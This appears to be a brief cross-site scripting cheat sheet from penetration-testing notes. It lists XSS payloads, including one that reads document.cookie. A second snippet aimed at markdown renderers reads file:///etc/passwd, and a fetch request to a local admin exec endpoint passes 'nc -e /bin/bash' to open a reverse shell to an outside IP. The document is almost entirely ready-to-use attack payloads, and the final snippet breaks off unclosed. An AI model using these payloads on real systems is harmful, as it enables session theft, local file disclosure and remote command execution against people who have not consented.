Common payloads
``` html
<svg onload=alert(1)>
<textarea onfocus=alert(1)>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
#"><img src=/ onerror=alert(document.cookie)>
<plaintext> //This stops rendering anything after and displays as plaintext
<K OnPointerRawUpdate=alert(1)>
\'/alert(1)//

```

Special payload for markdown files:

```html
<script> 
// Path Disclosure 
document.write(window.location); 
// Arbitrary Local File Read 
xhr = new XMLHttpRequest; 
xhr.onload=function(){document.write((this.responseText))}; xhr.open("GET","file:///etc/passwd"); 
xhr.send(); 
</script>



fetch('http://127.0.0.1/admin/exec', { 
method: 'POST',
body: 'command=nc -e 
/bin/bash 10.10.16.42 8888'
```